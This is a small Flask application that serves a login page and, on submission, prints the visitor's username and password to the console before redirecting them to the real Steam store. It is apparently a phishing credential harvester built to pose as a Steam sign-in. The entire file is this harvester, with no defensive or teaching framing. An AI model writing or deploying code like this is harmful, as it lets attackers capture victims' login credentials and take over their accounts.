from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)


@app.route('/')
@app.route('/index')
def index():
    return redirect(url_for('login'))


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # pass
        print(request.form['username'])
        print(request.form['password'])
        return redirect('https://store.steampowered.com/?snr=1_60_4__global-header')
    return render_template('login.html')


if __name__ == "__main__":
    app.run(debug=True)